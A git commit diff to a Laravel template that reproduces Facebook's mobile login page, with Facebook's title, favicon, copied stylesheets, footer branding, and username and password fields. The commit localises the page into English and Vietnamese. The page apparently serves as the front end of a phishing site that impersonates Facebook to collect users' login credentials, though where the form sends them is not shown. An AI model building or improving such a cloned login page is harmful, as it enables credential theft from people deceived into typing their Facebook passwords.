c39075ce808c0cf4ae083603fd9c0bc626642c8e
Hoàng Văn Kiên <kiendaotac92@gmail.com>
2022-03-04 18:28:11 +0700

    add change language english and vietnamese

--- resources/views/frontend/auth/login-mobile.blade.php
+++ resources/views/frontend/auth/login-mobile.blade.php
@@ -3,26 +3,20 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Facebook - Đăng nhập hoặc đăng ký</title>
+    <title>Facebook - {{ __('Log in or sign up') }}</title>
     <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
     <link href="assets/mobile/images/favicon.png" rel="shortcut icon" sizes="196x196">
     <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
     <meta name="theme-color" content="#3b5998">
-    <link type="text/css" rel="stylesheet" href="assets/mobile/css/0fDi6ijKUyo.css" data-bootloader-hash="MoYpVB9"
-          crossorigin="anonymous">
-    <link type="text/css" rel="stylesheet" href="assets/mobile/css/z9ppHSxO24O.css" data-bootloader-hash="aRsnqzl"
-          crossorigin="anonymous">
-    <link type="text/css" rel="stylesheet" href="assets/mobile/css/K4xMuoYbFyJ.css" data-bootloader-hash="0iYmMFG"
-          crossorigin="anonymous">
-    <link type="text/css" rel="stylesheet" href="assets/mobile/css/i8Lgq5jtfso.css" data-bootloader-hash="WZdEF9F"
-          crossorigin="anonymous">
-    <meta name="description"
-          content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
+    <link type="text/css" rel="stylesheet" href="assets/mobile/css/0fDi6ijKUyo.css" data-bootloader-hash="MoYpVB9" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="assets/mobile/css/z9ppHSxO24O.css" data-bootloader-hash="aRsnqzl" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="assets/mobile/css/K4xMuoYbFyJ.css" data-bootloader-hash="0iYmMFG" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="assets/mobile/css/i8Lgq5jtfso.css" data-bootloader-hash="WZdEF9F" crossorigin="anonymous">
+    <meta name="description" content="{{ __('Log in to Facebook to start sharing and connecting with your friends, family and people you know.') }}">
     <meta property="og:site_name" content="Facebook">
     <meta property="og:type" content="website">
     <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
-    <meta property="og:description"
-          content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
+    <meta property="og:description" content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
     <meta property="og:image" content="assets/mobile/images/fb_icon_325x325.png">
     <meta property="og:url" content="">
 
@@ -63,7 +57,7 @@
                                         <div class="_56be">
                                             <div class="_55wo _56bf">
                                                 <div class="_96n9">
-                                                    <input autocapitalize="off" type="text" class="_56bg _4u9z _5ruq _8qtn" name="username" placeholder="Số di động hoặc email">
+                                                    <input type="text" class="_56bg _4u9z _5ruq _8qtn" name="username" placeholder="{{ __('Email address or phone number') }}">
                                                 </div>
                                             </div>
                                         </div>
@@ -74,7 +68,7 @@
                                                     <div class="_7om2">
                                                         <div class="_4g34 _5i2i _52we">
                                                             <div class="_5xu4">
-                                                                <input class="_56bg _4u9z _27z2 _8qtm" name="password" placeholder="Mật khẩu" type="password">
+                                                                <input class="_56bg _4u9z _27z2 _8qtm" name="password" placeholder="{{ __('Password') }}" type="password">
                                                             </div>
                                                         </div>
                                                     </div>
@@ -85,8 +79,8 @@
                                     <div class="_2pie" style="text-align:center;">
                                         <div id="login_password_step_element"
                                              data-sigil="login_password_step_element">
-                                            <button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login">
-                                                <span class=" _55sr">Đăng nhập</span>
+                                            <button type="submit" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu">
+                                                <span class=" _55sr">{{ __('Log In') }}</span>
                                             </button>
                                         </div>
                                         <div class="_7eif" id="oauth_login_button_container" style="display:none">
@@ -99,21 +93,18 @@
                                 <div>
                                     <div class="_2pie _9omz">
                                         <div class="_52jj _9on1">
-                                            <a class="_9on1" tabindex="0" href="">Quên mật khẩu?</a>
+                                            <a class="_9on1" tabindex="0" href="">{{ __('Forgotten password?') }}</a>
                                         </div>
                                     </div>
                                     <div style="padding-top: 42px">
                                         <div>
                                             <div>
                                                 <div>
-                                                    <div id="login_reg_separator" class="_43mg _8qtf"
-                                                         data-sigil="login_reg_separator">
-                                                        <span class="_43mh">hoặc</span>
+                                                    <div id="login_reg_separator" class="_43mg _8qtf">
+                                                        <span class="_43mh">{{ __('or') }}</span>
                                                     </div>
-                                                    <div class="_52jj _5t3b" id="signup_button_area">
-                                                        <a role="button"
-                                                           class="_5t3c _28le btn btnS medBtn mfsm touchable"
-                                                           tabindex="0">Tạo tài khoản mới</a>
+                                                    <div class="_52jj _5t3b">
+                                                        <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable">{{ __('Create New Account') }}</a>
                                                     </div>
                                                 </div>
                                             </div>
@@ -140,42 +131,43 @@
                     <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                         <div class="_7om2">
                             <div class="_4g34">
-                                <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
+                                <span class="_52jc _52j9 _52jh _3ztb">
+                                    <a href="{{ route('language', 'vi') }}">Tiếng Việt</a>
+                                </span>
                                 <div class="_3ztc">
-                                        <span class="_52jc">
-                                            <a href="">中文(台灣)</a>
-                                        </span>
+                                    <span class="_52jc">
+                                        <a href="">中文(台灣)</a>
+                                    </span>
                                 </div>
                                 <div class="_3ztc">
-                                        <span class="_52jc">
-                                            <a href="">Español</a>
-                                        </span>
+                                    <span class="_52jc">
+                                        <a href="">Español</a>
+                                    </span>
                                 </div>
                                 <div class="_3ztc">
-                                        <span class="_52jc">
-                                            <a href="">Français (France)</a>
-                                        </span>
+                                    <span class="_52jc">
+                                        <a href="">Français (France)</a>
+                                    </span>
                                 </div>
                             </div>
                             <div class="_4g34">
                                 <div class="_3ztc">
-                                        <span class="_52jc">
-                                            <a href="">English (UK)</a>
-                                        </span>
+                                    <span class="_52jc">
+                                        <a href="{{ route('language', 'en') }}">English (UK)</a>
+                                    </span>
                                 </div>
                                 <div class="_3ztc">
-                                        <span class="_52jc">
-                                            <a href="">한국어</a>
-                                        </span>
+                                    <span class="_52jc">
+                                        <a href="">한국어</a>
+                                    </span>
                                 </div>
                                 <div class="_3ztc">
-                                        <span class="_52jc">
-                                            <a href="">Português (Brasil)</a>
-                                        </span>
+                                    <span class="_52jc">
+                                        <a href="">Português (Brasil)</a>
+                                    </span>
                                 </div>
                                 <a href="">
-                                    <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"
-                                         data-sigil="more_language">
+                                    <div class="_3j87 _1rrd _3ztd">
                                         <i class="img sp_8fkxYjN88QR_3x sx_bc1fc3"></i>
                                     </div>
                                 </a>
@@ -184,13 +176,11 @@
                     </div>
                     <div class="_5ui4">
                         <div class="_96qv _9a0a">
-                            <a href="" class="_96qw"
-                               title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới
-                                thiệu</a>
+                            <a href="" class="_96qw">{{ __('About') }}</a>
                             <span aria-hidden="true"> · </span>
-                            <a href="" class="_96qw" title="Truy cập Trung tâm trợ giúp của chúng tôi.">Trợ giúp</a>
+                            <a href="" class="_96qw">{{ __('Help') }}</a>
                             <span aria-hidden="true"> · </span>
-                            <span class="_96qw" id="u_0_5_UG">Xem thêm</span>
+                            <span class="_96qw" id="u_0_5_UG">{{ __('More') }}</span>
                         </div>
                         <span class="mfss fcg">Facebook, Inc.</span>
                     </div>
